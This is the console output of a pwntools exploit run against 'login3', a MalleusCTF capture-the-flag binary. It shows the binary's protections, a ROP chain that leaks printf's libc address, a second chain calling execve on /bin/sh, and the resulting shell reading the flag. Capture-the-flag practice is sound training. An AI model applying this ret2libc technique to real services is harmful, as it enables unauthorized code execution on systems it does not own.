```
$ python exploit.py r
[*] 'ctf/writeup/MalleusCTF/login3/login3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to host on port 10003: Done
[*] 'ctf/writeup/MalleusCTF/login3/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded cached gadgets for './login3'
0x0000:         0x400873 pop rdi; ret
0x0008:         0x601020 [arg0] rdi = got.printf
0x0010:         0x4005cc puts
0x0018:         0x400782 main()
Invalid ID or password

printf: 7f4c9dc8fe80
libc printf 64e80
[*] Loaded cached gadgets for './libc-2.27.so'
libc.search(b'/bin/sh').next() 7f4c9dddee9a
0x0000:   0x7f4c9dc4ee6a pop rsi; ret
0x0008:              0x0 [arg1] rsi = 0
0x0010:   0x7f4c9dc4c55f pop rdi; ret
0x0018:   0x7f4c9dddee9a [arg0] rdi = 139967042809498
0x0020:   0x7f4c9dd0fe30 execve
[*] Switching to interactive mode
Invalid ID or password
$ ls
flag.txt
login3
login3.sh
$ cat flag.txt
FLAG{vOvF4gQyzrRq50eH}
$
[*] Closed connection to host port 10003

```
